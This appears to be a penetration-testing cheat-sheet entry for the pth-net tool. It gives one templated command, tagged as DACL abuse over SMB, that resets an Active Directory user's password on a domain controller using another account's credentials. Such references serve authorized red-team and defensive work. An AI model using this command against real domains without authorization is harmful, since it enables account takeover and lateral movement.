# pth-net

## change user password (pth)
#plateform/linux #target/remote  #port/445 #protocol/smb #cat/ATTACK/DACL-ABUSE 
```
pth-net rpc password '<target_user>' '<new_password>' -U '<domain_netbios>'/'<user>'%'<password>' -S "<dc>"
```